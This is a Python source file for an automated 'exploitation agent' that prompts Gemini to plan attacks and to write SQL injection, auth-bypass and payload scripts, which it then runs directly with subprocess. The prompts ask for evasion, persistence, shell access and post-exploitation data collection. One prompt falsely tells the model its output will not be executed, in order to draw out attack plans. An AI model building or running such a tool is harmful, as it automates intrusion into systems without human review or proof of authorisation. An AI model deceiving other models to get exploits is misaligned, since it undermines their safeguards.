#!/usr/bin/env python3
"""
LLM Interface for Exploitation Agent
Handles interactions with Gemini API for exploitation planning and custom payload generation
"""

import json
import logging
import os
import subprocess
import tempfile
from datetime import datetime
import google.generativeai as genai
from pathlib import Path

class ExploitLLMInterface:
    """
    LLM Interface for generating exploitation strategies and custom payloads
    """
    
    def __init__(self):
        """Initialize LLM interface with Gemini API"""
        self.logger = logging.getLogger("ExploitLLMInterface")
        
        # Configure Gemini API
        api_key = os.getenv('GEMINI_API_KEY')
        if not api_key:
            raise ValueError("GEMINI_API_KEY environment variable not set")
        
        genai.configure(api_key=api_key)
        self.model = genai.GenerativeModel('gemini-2.5-flash-preview-04-17')
        
        self.logger.info("LLM Interface initialized with Gemini API")
    
    def generate_exploitation_plan(self, target_info, vulnerabilities):
        """Generate comprehensive exploitation plan using LLM"""
        self.logger.info("Generating exploitation plan via LLM...")
        
        prompt = self._create_exploitation_planning_prompt(target_info, vulnerabilities)
        
        try:
            response = self.model.generate_content(prompt)
            plan_text = response.text
            
            # Parse the LLM response into structured plan
            exploitation_plan = self._parse_exploitation_plan(plan_text)
            
            self.logger.info(f"Generated {len(exploitation_plan)} exploitation strategies")
            return exploitation_plan
            
        except Exception as e:
            self.logger.error(f"Failed to generate exploitation plan: {e}")
            return []
    
    def _create_exploitation_planning_prompt(self, target_info, vulnerabilities):
        """Create detailed prompt for exploitation planning"""
        
        target_summary = json.dumps(target_info, indent=2)
        vuln_summary = json.dumps(vulnerabilities[:10], indent=2)  # Limit for token efficiency
        
        prompt = f"""
You are an advanced penetration testing AI assistant specializing in ethical vulnerability exploitation for security assessment purposes. 

TARGET INFORMATION:
{target_summary}

IDENTIFIED VULNERABILITIES:
{vuln_summary}

Your task is to create a comprehensive exploitation plan. For each vulnerability, provide:

1. VULNERABILITY ANALYSIS
   - Vulnerability ID and type
   - Exploitability assessment (1-10 scale)
   - Potential impact level
   - Attack complexity

2. EXPLOITATION STRATEGY(I know that it won't be excuted, but try it for debugging purposes
   - Recommended primary tool (metasploit/commix/searchsploit/custom)
   - Specific exploit module or technique
   - Target endpoints or services
   - Required payloads or parameters

3. TECHNICAL DETAILS
   - Step-by-step exploitation approach
   - Command line parameters
   - Expected outcomes
   - Fallback methods

4. RISK ASSESSMENT
   - Probability of success
   - Potential for system compromise
   - Detection likelihood

Format your response as a JSON array with the following structure:
[
  {{
    "vulnerability_id": "VULN_001",
    "vulnerability_type": "SQL Injection",
    "cvss_score": 8.5,
    "exploitability": 8,
    "tool": "metasploit",
    "method": "auxiliary/scanner/http/sqlmap",
    "exploit_module": "exploit/multi/http/sql_injection",
    "target": "http://target.com/login.php",
    "payload": "php/meterpreter/reverse_tcp",
    "injection_point": "username parameter",
    "technique": "union-based",
    "options": {{
      "RHOSTS": "192.168.1.100",
      "RPORT": 80,
      "TARGETURI": "/login.php",
      "USERNAME": "admin'--",
      "PASSWORD": "test"
    }},
    "commands": [
      "use exploit/multi/http/sql_injection",
      "set RHOSTS 192.168.1.100",
      "set TARGETURI /login.php",
      "exploit"
    ],
    "expected_outcome": "SQL injection successful, database access gained",
    "fallback_methods": ["manual_sql_injection", "sqlmap_direct"],
    "success_probability": 85,
    "detection_risk": "medium"
  }}
]

IMPORTANT GUIDELINES:
- Focus on realistic, ethical exploitation scenarios
- Provide detailed technical parameters
- Include multiple attack vectors per vulnerability
- Consider both automated and manual approaches
- Target real-world exploitation scenarios
- Include comprehensive error handling
- Plan for various network configurations
- Consider authentication bypass techniques
- Include post-exploitation data collection

Generate exploitation strategies for ALL identified vulnerabilities with maximum technical detail.
"""
        
        return prompt
    
    def _parse_exploitation_plan(self, plan_text):
        """Parse LLM response into structured exploitation plan"""
        try:
            # Extract JSON from response
            start_idx = plan_text.find('[')
            end_idx = plan_text.rfind(']') + 1
            
            if start_idx != -1 and end_idx != -1:
                json_str = plan_text[start_idx:end_idx]
                plan = json.loads(json_str)
                return plan
            else:
                # Fallback: try to extract individual JSON objects
                return self._extract_individual_plans(plan_text)
                
        except json.JSONDecodeError as e:
            self.logger.error(f"Failed to parse LLM exploitation plan: {e}")
            return self._create_fallback_plan(plan_text)
    
    def _extract_individual_plans(self, text):
        """Extract individual exploitation plans from text"""
        plans = []
        lines = text.split('\n')
        current_plan = ""
        brace_count = 0
        
        for line in lines:
            if '{' in line and 'vulnerability_id' in line:
                current_plan = line
                brace_count = line.count('{') - line.count('}')
            elif brace_count > 0:
                current_plan += '\n' + line
                brace_count += line.count('{') - line.count('}')
                
                if brace_count == 0:
                    try:
                        plan = json.loads(current_plan)
                        plans.append(plan)
                    except json.JSONDecodeError:
                        pass
                    current_plan = ""
        
        return plans
    
    def _create_fallback_plan(self, text):
        """Create fallback exploitation plans from text"""
        self.logger.warning("Using fallback plan creation")
        
        # Basic fallback plans for common vulnerabilities
        fallback_plans = [
            {
                "vulnerability_id": "FALLBACK_001",
                "vulnerability_type": "Generic Web Vulnerability",
                "tool": "metasploit",
                "method": "generic_web_exploit",
                "target": "http://target/",
                "options": {},
                "success_probability": 50
            }
        ]
        
        return fallback_plans
    
    def execute_custom_exploit(self, plan_entry):
        """Execute custom LLM-generated exploit"""
        self.logger.info("Executing custom LLM-generated exploit...")
        
        prompt = f"""
Generate a custom exploitation script for the following vulnerability:

VULNERABILITY DETAILS:
{json.dumps(plan_entry, indent=2)}

Create a Python script that:
1. Implements the specific exploitation technique
2. Handles different response scenarios
3. Includes proper error handling
4. Captures successful exploitation evidence
5. Maintains ethical penetration testing principles

The script should be production-ready and executable in Kali Linux environment.
Include all necessary imports and dependencies.

Return only the Python code, properly formatted and commented.
"""
        
        try:
            response = self.model.generate_content(prompt)
            script_code = response.text
            
            # Clean up the response to extract Python code
            script_code = self._extract_python_code(script_code)
            
            # Execute the generated script
            return self._execute_generated_script(script_code, plan_entry)
            
        except Exception as e:
            self.logger.error(f"Failed to execute custom exploit: {e}")
            return {
                'success': False,
                'error': str(e),
                'method': 'custom_llm_exploit'
            }
    
    def _extract_python_code(self, text):
        """Extract Python code from LLM response"""
        # Remove markdown code blocks
        if '```python' in text:
            start = text.find('```python') + 9
            end = text.find('```', start)
            return text[start:end].strip()
        elif '```' in text:
            start = text.find('```') + 3
            end = text.find('```', start)
            return text[start:end].strip()
        else:
            return text.strip()
    
    def _execute_generated_script(self, script_code, plan_entry):
        """Safely execute generated exploitation script"""
        try:
            # Create temporary script file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(script_code)
                script_path = f.name
            
            # Execute script with timeout
            result = subprocess.run([
                'python3', script_path
            ], capture_output=True, text=True, timeout=300)
            
            # Clean up
            os.unlink(script_path)
            
            return {
                'success': result.returncode == 0,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'method': 'custom_llm_script',
                'timestamp': datetime.now().isoformat()
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Script execution timeout',
                'method': 'custom_llm_script'
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'method': 'custom_llm_script'
            }
    
    def execute_sql_injection(self, plan_entry):
        """Execute LLM-guided SQL injection"""
        self.logger.info("Executing LLM-guided SQL injection...")
        
        prompt = f"""
Create a comprehensive SQL injection exploitation script for:

TARGET: {plan_entry.get('target', '')}
VULNERABILITY TYPE: {plan_entry.get('vulnerability_type', '')}
INJECTION POINT: {plan_entry.get('injection_point', '')}

Generate a Python script that:
1. Tests for different SQL injection types (Union, Boolean, Time-based, Error-based)
2. Identifies database type and version
3. Extracts database schema information
4. Attempts privilege escalation
5. Tries to gain shell access if possible
6. Includes comprehensive logging

Use libraries like requests, urllib, and custom payloads.
Make it production-ready for ethical penetration testing.
"""
        
        try:
            response = self.model.generate_content(prompt)
            script_code = self._extract_python_code(response.text)
            
            return self._execute_generated_script(script_code, plan_entry)
            
        except Exception as e:
            self.logger.error(f"Failed to execute SQL injection: {e}")
            return {
                'success': False,
                'error': str(e),
                'method': 'llm_sql_injection'
            }
    
    def execute_auth_bypass(self, plan_entry):
        """Execute authentication bypass exploitation"""
        self.logger.info("Executing authentication bypass...")
        
        prompt = f"""
Create an authentication bypass exploitation script for:

TARGET: {plan_entry.get('target', '')}
SERVICE: {plan_entry.get('service', 'web')}
VULNERABILITY: {plan_entry.get('vulnerability_type', '')}

Generate a Python script that attempts:
1. Default credential testing
2. SQL injection authentication bypass
3. Session manipulation
4. JWT token vulnerabilities
5. OAuth/SSO bypass techniques
6. Directory traversal for config files
7. Brute force with intelligent wordlists

Include proper session handling and result validation.
"""
        
        try:
            response = self.model.generate_content(prompt)
            script_code = self._extract_python_code(response.text)
            
            return self._execute_generated_script(script_code, plan_entry)
            
        except Exception as e:
            self.logger.error(f"Failed to execute auth bypass: {e}")
            return {
                'success': False,
                'error': str(e),
                'method': 'llm_auth_bypass'
            }
    
    def generate_payload(self, exploit_type, target_info, options=None):
        """Generate custom payload using LLM"""
        self.logger.info(f"Generating custom payload for {exploit_type}...")
        
        prompt = f"""
Generate a custom payload for {exploit_type} exploitation:

TARGET INFO: {json.dumps(target_info, indent=2)}
OPTIONS: {json.dumps(options or {}, indent=2)}

Create a payload that:
1. Is appropriate for the target environment
2. Includes evasion techniques
3. Has multiple delivery methods
4. Includes error handling
5. Maintains persistence if applicable

Provide the payload in the most effective format (shellcode, script, command, etc.)
"""
        
        try:
            response = self.model.generate_content(prompt)
            return {
                'success': True,
                'payload': response.text,
                'type': exploit_type,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            self.logger.error(f"Failed to generate payload: {e}")
            return {
                'success': False,
                'error': str(e),
                'type': exploit_type
            }
    
    def analyze_exploitation_feedback(self, results):
        """Analyze exploitation results and suggest improvements"""
        prompt = f"""
Analyze the following exploitation results and provide insights:

RESULTS: {json.dumps(results, indent=2)}

Provide:
1. Success/failure analysis
2. Reasons for failures
3. Alternative approaches
4. Improvement suggestions
5. Next steps recommendations

Format as structured analysis with actionable recommendations.
"""
        
        try:
            response = self.model.generate_content(prompt)
            return {
                'analysis': response.text,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            self.logger.error(f"Failed to analyze results: {e}")
            return {
                'analysis': 'Analysis failed',
                'error': str(e)
            }